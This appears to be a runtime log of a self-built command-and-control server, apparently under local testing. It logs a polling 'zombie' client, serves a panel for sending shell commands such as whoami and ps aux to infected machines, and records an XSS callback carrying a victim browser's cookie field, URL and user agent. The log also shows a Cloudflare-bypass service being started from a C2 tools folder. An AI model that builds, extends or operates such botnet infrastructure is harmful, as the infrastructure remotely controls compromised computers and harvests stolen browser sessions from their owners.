2025-06-24 23:20:29 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:20:29] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:20:30 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:20:30 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:20:30 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:20:30 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:20:30] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:20:31 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:20:31 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:20:31 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0012s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:20:31 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:20:31] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:20:32 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:20:32 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:20:32 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:20:32 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:20:32] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:20:33 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:20:33 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:20:33 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:20:33 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:20:33] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:20:34 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:20:34 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:20:34 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0006s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:20:34 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:20:34] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:20:34 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_messages()
2025-06-24 23:20:34 | INFO     | control_route.py:71 | get_messages() | 用戶請求獲取消息
2025-06-24 23:20:34 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_messages 執行完畢 (耗時: 0.0007s) -> 回傳: '<!DOCTYPE html>\n<html lang="zh-TW">\n    \n    <head>\n        <meta charset="UTF-8">\n        <meta name="viewport" content="width=device-width, initial-scale=1.0">\n        <title>控制消息</title>\n        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css">\n        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">\n        \n    </head>\n    <body>\n        <!-- 导航栏 -->\n        <nav class="navbar navbar-expand-lg navbar-dark bg-primary">\n            <div class="container">\n                <a class="navbar-brand" href="/">\n                    <i class="fas fa-shield-alt"></i> 扫描目标管理系统\n                </a>\n                <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">\n                    <span class="navbar-toggler-icon"></span>\n                </button>\n                <div class="collapse navbar-collapse" id="navbarNav">\n                    <ul class="navbar-nav ms-auto">\n                        <li class="nav-item">\n                            <a class="nav-link" href="/">\n                                <i class="fas fa-home"></i> 目标列表\n                            </a>\n                        </li>\n                        <li class="nav-item">\n                            <a class="nav-link" href="/add_target">\n                                <i class="fas fa-plus"></i> 添加目标\n                            </a>\n                        </li>\n                        <li class="nav-item">\n                            <a class="nav-link" href="/api/control/get_messages">\n                                <i class="fas fa-cog"></i> 控制消息\n                            </a>\n                        </li>\n                    </ul>\n                </div>\n            </div>\n        </nav>\n\n        \n        \n        \n\n        \n<div class="container">\n    <!-- Flash 消息區域 -->\n    \n    \n    \n\n    <!-- 選項卡導航 -->\n    <div class="tab-navigation">\n        <button class="tab-btn active" onclick="showTab(\'messages\')">📨 控制消息</button>\n        <button class="tab-btn" onclick="showTab(\'zombies\')">🧟 殭屍管理</button>\n    </div>\n\n    <!-- 控制消息選項卡 -->\n    <div id="messages-tab" class="tab-content active">\n        <h2>控制消息</h2>\n        <p style="text-align: center; color: #6c757d; font-style: italic;">透過此面板管理和監控您的C2控制消息</p>\n        <form method="post" action="/api/control/add_message">\n            <div class="form-group">\n                <label class="form-label" for="message">控制消息</label>\n                <input type="text" id="message" name="message" placeholder="輸入要發送的控制消息" required>\n            </div>\n            <div class="form-group">\n                <label class="form-label" for="target_ip">目標IP地址</label>\n                <input type="text" id="target_ip" name="target_ip" placeholder="輸入目標IP地址（可選）">\n            </div>\n            <button type="submit">發送消息</button>\n        </form>\n    </div>\n\n    <!-- 殭屍管理選項卡 -->\n    <div id="zombies-tab" class="tab-content">\n        <h2>殭屍機器管理</h2>\n        <p style="text-align: center; color: #6c757d; font-style: italic;">管理已連接的殭屍機器並發送命令</p>\n\n        <!-- 殭屍機器列表 -->\n        <div class="zombie-controls">\n            <button id="refresh-zombies" class="refresh-btn">🔄 刷新殭屍列表</button>\n            <div id="zombie-count" class="zombie-count">載入中...</div>\n        </div>\n\n        <div id="zombie-list" class="zombie-list">\n            <!-- 殭屍機器將通過JavaScript動態載入 -->\n        </div>\n\n        <!-- 命令發送表單 -->\n        <div class="command-form-container" style="display: none;" id="command-form-container">\n            <h3>發送命令給殭屍機器</h3>\n            <form id="command-form">\n                <div class="form-group">\n                    <label class="form-label" for="selected-zombie">選中的殭屍機器</label>\n                    <input type="text" id="selected-zombie" readonly>\n                </div>\n                <div class="form-group">\n                    <label class="form-label" for="command">執行命令</label>\n                    <input type="text" id="command" name="command" placeholder="輸入要執行的命令" required>\n                </div>\n                <div class="form-group">\n                    <label class="form-label">常用命令</label>\n                    <div class="quick-commands">\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'whoami\')">whoami</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'pwd\')">pwd</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'ls -la\')">ls -la</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'ps aux\')">ps aux</button>\n                        <button type="button" class="quick-cmd-btn"\n                            onclick="setCommand(\'netstat -tuln\')">netstat</button>\n                    </div>\n                </div>\n                <button type="submit">💀 發送命令</button>\n                <button type="button" onclick="hideCommandForm()">取消</button>\n            </form>\n        </div>\n    </div>\n    <div style="display: flex; justify-content: space-between; align-items: center; margin: 40px 0 20px 0;">\n        <h1 style="margin: 0;">已經知道的消息列表</h1>\n        <a href="/api/control/help" class="help-btn">📚 查看使用說明</a>\n    </div>\n    <div id="messageList">\n        \n        \n        <div class="message">\n            <p><strong>目標IP:</strong> victim-browser</p>\n            <p><strong>目標配置:</strong> XSS_GET_signal</p>\n            <p><strong>建立時間:</strong> 2025-06-24 23:16:45.339064</p>\n        </div>\n        \n        <div class="message">\n            <p><strong>目標IP:</strong> 127.0.0.1</p>\n            <p><strong>目標配置:</strong> {&#34;where&#34;:&#34;http://127.0.0.1:8000/&#34;,&#34;target_ip&#34;:&#34;127.0.0.1&#34;,&#34;cookie&#34;:&#34;&#34;,&#34;user_agent&#34;:&#34;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36&#34;,&#34;time_stamp&#34;:&#34;2025-06-24T15:19:27.951Z&#34;}</p>\n            <p><strong>建立時間:</strong> 2025-06-24 23:19:27.955085</p>\n        </div>\n        \n        \n    </div>\n</div>\n<link rel="stylesheet" href="/static/css/control_message.css">\n\n<script>\n    // 選項卡切換功能\n    function showTab(tabName) {\n        // 隱藏所有選項卡內容\n        const tabContents = document.querySelectorAll(\'.tab-content\');\n        tabContents.forEach(tab => {\n            tab.classList.remove(\'active\');\n        });\n\n        // 移除所有選項卡按鈕的活動狀態\n        const tabBtns = document.querySelectorAll(\'.tab-btn\');\n        tabBtns.forEach(btn => {\n            btn.classList.remove(\'active\');\n        });\n\n        // 顯示選中的選項卡\n        document.getElementById(tabName + \'-tab\').classList.add(\'active\');\n        event.target.classList.add(\'active\');\n\n        // 如果切換到殭屍管理選項卡，自動載入殭屍列表\n        if (tabName === \'zombies\') {\n            loadZombies();\n        }\n    }\n\n    // 載入殭屍機器列表\n    async function loadZombies() {\n        try {\n            const response = await fetch(\'/api/control/get_zombies\');\n            const data = await response.json();\n\n            const zombieCountEl = document.getElementById(\'zombie-count\');\n            const zombieListEl = document.getElementById(\'zombie-list\');\n\n            if (data.status === \'success\') {\n                zombieCountEl.textContent = `找到 ${data.count} 台殭屍機器`;\n\n                if (data.zombies.length === 0) {\n                    zombieListEl.innerHTML = \'<div class="empty-state">目前沒有連接的殭屍機器</div>\';\n                } else {\n                    let zombieHtml = \'\';\n                    data.zombies.forEach(zombie => {\n                        zombieHtml += `\n                        <div class="zombie-card" onclick="selectZombie(\'${zombie}\')">\n                            <div class="zombie-info">\n                                <h4>🧟 ${zombie}</h4>\n                                <p>點擊選擇此殭屍機器</p>\n                            </div>\n                            <div class="zombie-actions">\n                                <button class="action-btn" onclick="event.stopPropagation(); selectZombie(\'${zombie}\')">\n                                    💀 發送命令\n                                </button>\n                            </div>\n                        </div>\n                    `;\n                    });\n                    zombieListEl.innerHTML = zombieHtml;\n                }\n            } else {\n                zombieCountEl.textContent = \'載入失敗\';\n                zombieListEl.innerHTML = `<div class="error-state">載入失敗: ${data.error}</div>`;\n            }\n        } catch (error) {\n            console.error(\'載入殭屍列表失敗:\', error);\n            document.getElementById(\'zombie-count\').textContent = \'載入失敗\';\n            document.getElementById(\'zombie-list\').innerHTML = \'<div class="error-state">網路錯誤</div>\';\n        }\n    }\n\n    // 選擇殭屍機器\n    function selectZombie(zombieIp) {\n        document.getElementById(\'selected-zombie\').value = zombieIp;\n        document.getElementById(\'command-form-container\').style.display = \'block\';\n        document.getElementById(\'command\').focus();\n    }\n\n    // 隱藏命令表單\n    function hideCommandForm() {\n        document.getElementById(\'command-form-container\').style.display = \'none\';\n        document.getElementById(\'command\').value = \'\';\n        document.getElementById(\'selected-zombie\').value = \'\';\n    }\n\n    // 設置快速命令\n    function setCommand(cmd) {\n        document.getElementById(\'command\').value = cmd;\n    }\n\n    // 發送命令給殭屍機器\n    document.getElementById(\'command-form\').addEventListener(\'submit\', async function (e) {\n        e.preventDefault();\n\n        const zombieIp = document.getElementById(\'selected-zombie\').value;\n        const command = document.getElementById(\'command\').value;\n\n        if (!zombieIp || !command) {\n            alert(\'請選擇殭屍機器並輸入命令\');\n            return;\n        }\n\n        try {\n            const formData = new FormData();\n            formData.append(\'command\', command);\n\n            const response = await fetch(`/api/control/add_command_to_do/${zombieIp}`, {\n                method: \'POST\',\n                body: formData\n            });\n\n            if (response.ok) {\n                alert(`命令已發送給 ${zombieIp}`);\n                hideCommandForm();\n            } else {\n                const errorData = await response.json();\n                alert(`發送失敗: ${errorData.error}`);\n            }\n        } catch (error) {\n            console.error(\'發送命令失敗:\', error);\n            alert(\'發送命令時發生網路錯誤\');\n        }\n    });\n\n    // 刷新殭屍列表\n    document.getElementById(\'refresh-zombies\').addEventListener(\'click\', loadZombies);\n\n    // 頁面載入時檢查當前選項卡\n    document.addEventListener(\'DOMContentLoaded\', function () {\n        // 檢查URL參數是否指定了選項卡\n        const urlParams = new URLSearchParams(window.location.search);\n        const tab = urlParams.get(\'tab\');\n        if (tab === \'zombies\') {\n            showTab(\'zombies\');\n        }\n    });\n</script>\n\n\n\n        <!-- JavaScript 引用 -->\n        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js"></script>\n        \n    </body>\n    \n</html>'
2025-06-24 23:20:34 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:20:34] "GET /api/control/get_messages HTTP/1.1" 200 -
2025-06-24 23:20:34 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:20:34] "[36mGET /static/css/control_message.css HTTP/1.1[0m" 304 -
2025-06-24 23:20:34 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:20:34] "GET /favicon.ico HTTP/1.1" 200 -
2025-06-24 23:20:35 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:20:35 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:20:35 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:20:35 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:20:35] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:20:36 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:20:36 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:20:36 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:20:36 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:20:36] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:20:37 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:20:37 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:20:37 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0018s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:20:37 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:20:37] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:20:38 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:20:38 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:20:38 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:20:38 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:20:38] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:20:39 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:20:39 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:20:39 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:20:39 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:20:39] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:20:40 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:20:40 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:20:40 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:20:40 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:20:40] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:20:48 | INFO     | config.py:217 | setup_enhanced_logging() | 🚀 增強日誌系統已啟動
2025-06-24 23:20:48 | INFO     | config.py:217 | setup_enhanced_logging() | 🚀 增強日誌系統已啟動
2025-06-24 23:20:48 | DEBUG    | config.py:218 | setup_enhanced_logging() | 調試級別日誌已啟用
2025-06-24 23:20:48 | DEBUG    | config.py:218 | setup_enhanced_logging() | 調試級別日誌已啟用
2025-06-24 23:20:48 | INFO     | app.py:186 | create_app() | 正在檢查 FlareSolverr 服務...
2025-06-24 23:20:48 | INFO     | app.py:186 | create_app() | 正在檢查 FlareSolverr 服務...
2025-06-24 23:20:48 | INFO     | app.py:196 | create_app() | 正在啟動 FlareSolverr 服務...
2025-06-24 23:20:48 | INFO     | app.py:196 | create_app() | 正在啟動 FlareSolverr 服務...
2025-06-24 23:20:48 | INFO     | start_flaresolverr.py:77 | start_flaresolverr() | 正在啟動 FlareSolverr: /home/hacker/Desktop/share/C2/tools/FlareSolverr/src/flaresolverr.py
2025-06-24 23:20:52 | INFO     | start_flaresolverr.py:104 | start_flaresolverr() | FlareSolverr 啟動成功，運行在 http://localhost:8191
2025-06-24 23:20:52 | INFO     | start_flaresolverr.py:242 | start_monitoring() | FlareSolverr 監控已啟動
2025-06-24 23:20:52 | INFO     | app.py:199 | create_app() | ✅ FlareSolverr 服務已啟動
2025-06-24 23:20:52 | INFO     | app.py:199 | create_app() | ✅ FlareSolverr 服務已啟動
2025-06-24 23:20:52 | INFO     | config.py:217 | setup_enhanced_logging() | 🚀 增強日誌系統已啟動
2025-06-24 23:20:52 | INFO     | config.py:217 | setup_enhanced_logging() | 🚀 增強日誌系統已啟動
2025-06-24 23:20:52 | DEBUG    | config.py:218 | setup_enhanced_logging() | 調試級別日誌已啟用
2025-06-24 23:20:52 | DEBUG    | config.py:218 | setup_enhanced_logging() | 調試級別日誌已啟用
2025-06-24 23:20:52 | INFO     | app.py:186 | create_app() | 正在檢查 FlareSolverr 服務...
2025-06-24 23:20:52 | INFO     | app.py:186 | create_app() | 正在檢查 FlareSolverr 服務...
2025-06-24 23:20:52 | INFO     | app.py:196 | create_app() | 正在啟動 FlareSolverr 服務...
2025-06-24 23:20:52 | INFO     | app.py:196 | create_app() | 正在啟動 FlareSolverr 服務...
2025-06-24 23:20:52 | INFO     | start_flaresolverr.py:59 | start_flaresolverr() | FlareSolverr 已經在運行
2025-06-24 23:20:52 | INFO     | app.py:199 | create_app() | ✅ FlareSolverr 服務已啟動
2025-06-24 23:20:52 | INFO     | app.py:199 | create_app() | ✅ FlareSolverr 服務已啟動
2025-06-24 23:20:52 | INFO     | _internal.py:97 | _log() | [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on http://127.0.0.1:8964
2025-06-24 23:20:52 | INFO     | _internal.py:97 | _log() | [33mPress CTRL+C to quit[0m
2025-06-24 23:20:52 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:20:52 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:20:52 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0250s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:20:52 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:20:52] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:20:53 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_messages()
2025-06-24 23:20:53 | INFO     | control_route.py:71 | get_messages() | 用戶請求獲取消息
2025-06-24 23:20:53 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_messages 執行完畢 (耗時: 0.0095s) -> 回傳: '<!DOCTYPE html>\n<html lang="zh-TW">\n    \n    <head>\n        <meta charset="UTF-8">\n        <meta name="viewport" content="width=device-width, initial-scale=1.0">\n        <title>控制消息</title>\n        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css">\n        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">\n        \n    </head>\n    <body>\n        <!-- 导航栏 -->\n        <nav class="navbar navbar-expand-lg navbar-dark bg-primary">\n            <div class="container">\n                <a class="navbar-brand" href="/">\n                    <i class="fas fa-shield-alt"></i> 扫描目标管理系统\n                </a>\n                <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">\n                    <span class="navbar-toggler-icon"></span>\n                </button>\n                <div class="collapse navbar-collapse" id="navbarNav">\n                    <ul class="navbar-nav ms-auto">\n                        <li class="nav-item">\n                            <a class="nav-link" href="/">\n                                <i class="fas fa-home"></i> 目标列表\n                            </a>\n                        </li>\n                        <li class="nav-item">\n                            <a class="nav-link" href="/add_target">\n                                <i class="fas fa-plus"></i> 添加目标\n                            </a>\n                        </li>\n                        <li class="nav-item">\n                            <a class="nav-link" href="/api/control/get_messages">\n                                <i class="fas fa-cog"></i> 控制消息\n                            </a>\n                        </li>\n                    </ul>\n                </div>\n            </div>\n        </nav>\n\n        \n        \n        \n\n        \n<div class="container">\n    <!-- Flash 消息區域 -->\n    \n    \n    \n\n    <!-- 選項卡導航 -->\n    <div class="tab-navigation">\n        <button class="tab-btn active" onclick="showTab(\'messages\')">📨 控制消息</button>\n        <button class="tab-btn" onclick="showTab(\'zombies\')">🧟 殭屍管理</button>\n    </div>\n\n    <!-- 控制消息選項卡 -->\n    <div id="messages-tab" class="tab-content active">\n        <h2>控制消息</h2>\n        <p style="text-align: center; color: #6c757d; font-style: italic;">透過此面板管理和監控您的C2控制消息</p>\n        <form method="post" action="/api/control/add_message">\n            <div class="form-group">\n                <label class="form-label" for="message">控制消息</label>\n                <input type="text" id="message" name="message" placeholder="輸入要發送的控制消息" required>\n            </div>\n            <div class="form-group">\n                <label class="form-label" for="target_ip">目標IP地址</label>\n                <input type="text" id="target_ip" name="target_ip" placeholder="輸入目標IP地址（可選）">\n            </div>\n            <button type="submit">發送消息</button>\n        </form>\n    </div>\n\n    <!-- 殭屍管理選項卡 -->\n    <div id="zombies-tab" class="tab-content">\n        <h2>殭屍機器管理</h2>\n        <p style="text-align: center; color: #6c757d; font-style: italic;">管理已連接的殭屍機器並發送命令</p>\n\n        <!-- 殭屍機器列表 -->\n        <div class="zombie-controls">\n            <button id="refresh-zombies" class="refresh-btn">🔄 刷新殭屍列表</button>\n            <div id="zombie-count" class="zombie-count">載入中...</div>\n        </div>\n\n        <div id="zombie-list" class="zombie-list">\n            <!-- 殭屍機器將通過JavaScript動態載入 -->\n        </div>\n\n        <!-- 命令發送表單 -->\n        <div class="command-form-container" style="display: none;" id="command-form-container">\n            <h3>發送命令給殭屍機器</h3>\n            <form id="command-form">\n                <div class="form-group">\n                    <label class="form-label" for="selected-zombie">選中的殭屍機器</label>\n                    <input type="text" id="selected-zombie" readonly>\n                </div>\n                <div class="form-group">\n                    <label class="form-label" for="command">執行命令</label>\n                    <input type="text" id="command" name="command" placeholder="輸入要執行的命令" required>\n                </div>\n                <div class="form-group">\n                    <label class="form-label">常用命令</label>\n                    <div class="quick-commands">\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'whoami\')">whoami</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'pwd\')">pwd</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'ls -la\')">ls -la</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'ps aux\')">ps aux</button>\n                        <button type="button" class="quick-cmd-btn"\n                            onclick="setCommand(\'netstat -tuln\')">netstat</button>\n                    </div>\n                </div>\n                <button type="submit">💀 發送命令</button>\n                <button type="button" onclick="hideCommandForm()">取消</button>\n            </form>\n        </div>\n    </div>\n    <div style="display: flex; justify-content: space-between; align-items: center; margin: 40px 0 20px 0;">\n        <h1 style="margin: 0;">已經知道的消息列表</h1>\n        <a href="/api/control/help" class="help-btn">📚 查看使用說明</a>\n    </div>\n    <div id="messageList">\n        \n        <div class="empty-state">\n            目前沒有任何消息\n        </div>\n        \n    </div>\n</div>\n<link rel="stylesheet" href="/static/css/control_message.css">\n\n<script>\n    // 選項卡切換功能\n    function showTab(tabName) {\n        // 隱藏所有選項卡內容\n        const tabContents = document.querySelectorAll(\'.tab-content\');\n        tabContents.forEach(tab => {\n            tab.classList.remove(\'active\');\n        });\n\n        // 移除所有選項卡按鈕的活動狀態\n        const tabBtns = document.querySelectorAll(\'.tab-btn\');\n        tabBtns.forEach(btn => {\n            btn.classList.remove(\'active\');\n        });\n\n        // 顯示選中的選項卡\n        document.getElementById(tabName + \'-tab\').classList.add(\'active\');\n        event.target.classList.add(\'active\');\n\n        // 如果切換到殭屍管理選項卡，自動載入殭屍列表\n        if (tabName === \'zombies\') {\n            loadZombies();\n        }\n    }\n\n    // 載入殭屍機器列表\n    async function loadZombies() {\n        try {\n            const response = await fetch(\'/api/control/get_zombies\');\n            const data = await response.json();\n\n            const zombieCountEl = document.getElementById(\'zombie-count\');\n            const zombieListEl = document.getElementById(\'zombie-list\');\n\n            if (data.status === \'success\') {\n                zombieCountEl.textContent = `找到 ${data.count} 台殭屍機器`;\n\n                if (data.zombies.length === 0) {\n                    zombieListEl.innerHTML = \'<div class="empty-state">目前沒有連接的殭屍機器</div>\';\n                } else {\n                    let zombieHtml = \'\';\n                    data.zombies.forEach(zombie => {\n                        zombieHtml += `\n                        <div class="zombie-card" onclick="selectZombie(\'${zombie}\')">\n                            <div class="zombie-info">\n                                <h4>🧟 ${zombie}</h4>\n                                <p>點擊選擇此殭屍機器</p>\n                            </div>\n                            <div class="zombie-actions">\n                                <button class="action-btn" onclick="event.stopPropagation(); selectZombie(\'${zombie}\')">\n                                    💀 發送命令\n                                </button>\n                            </div>\n                        </div>\n                    `;\n                    });\n                    zombieListEl.innerHTML = zombieHtml;\n                }\n            } else {\n                zombieCountEl.textContent = \'載入失敗\';\n                zombieListEl.innerHTML = `<div class="error-state">載入失敗: ${data.error}</div>`;\n            }\n        } catch (error) {\n            console.error(\'載入殭屍列表失敗:\', error);\n            document.getElementById(\'zombie-count\').textContent = \'載入失敗\';\n            document.getElementById(\'zombie-list\').innerHTML = \'<div class="error-state">網路錯誤</div>\';\n        }\n    }\n\n    // 選擇殭屍機器\n    function selectZombie(zombieIp) {\n        document.getElementById(\'selected-zombie\').value = zombieIp;\n        document.getElementById(\'command-form-container\').style.display = \'block\';\n        document.getElementById(\'command\').focus();\n    }\n\n    // 隱藏命令表單\n    function hideCommandForm() {\n        document.getElementById(\'command-form-container\').style.display = \'none\';\n        document.getElementById(\'command\').value = \'\';\n        document.getElementById(\'selected-zombie\').value = \'\';\n    }\n\n    // 設置快速命令\n    function setCommand(cmd) {\n        document.getElementById(\'command\').value = cmd;\n    }\n\n    // 發送命令給殭屍機器\n    document.getElementById(\'command-form\').addEventListener(\'submit\', async function (e) {\n        e.preventDefault();\n\n        const zombieIp = document.getElementById(\'selected-zombie\').value;\n        const command = document.getElementById(\'command\').value;\n\n        if (!zombieIp || !command) {\n            alert(\'請選擇殭屍機器並輸入命令\');\n            return;\n        }\n\n        try {\n            const formData = new FormData();\n            formData.append(\'command\', command);\n\n            const response = await fetch(`/api/control/add_command_to_do/${zombieIp}`, {\n                method: \'POST\',\n                body: formData\n            });\n\n            if (response.ok) {\n                alert(`命令已發送給 ${zombieIp}`);\n                hideCommandForm();\n            } else {\n                const errorData = await response.json();\n                alert(`發送失敗: ${errorData.error}`);\n            }\n        } catch (error) {\n            console.error(\'發送命令失敗:\', error);\n            alert(\'發送命令時發生網路錯誤\');\n        }\n    });\n\n    // 刷新殭屍列表\n    document.getElementById(\'refresh-zombies\').addEventListener(\'click\', loadZombies);\n\n    // 頁面載入時檢查當前選項卡\n    document.addEventListener(\'DOMContentLoaded\', function () {\n        // 檢查URL參數是否指定了選項卡\n        const urlParams = new URLSearchParams(window.location.search);\n        const tab = urlParams.get(\'tab\');\n        if (tab === \'zombies\') {\n            showTab(\'zombies\');\n        }\n    });\n</script>\n\n\n\n        <!-- JavaScript 引用 -->\n        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js"></script>\n        \n    </body>\n    \n</html>'
2025-06-24 23:20:53 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:20:53] "GET /api/control/get_messages HTTP/1.1" 200 -
2025-06-24 23:20:53 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:20:53] "[36mGET /static/css/control_message.css HTTP/1.1[0m" 304 -
2025-06-24 23:20:53 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:20:53] "GET /favicon.ico HTTP/1.1" 200 -
2025-06-24 23:20:53 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:20:53 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
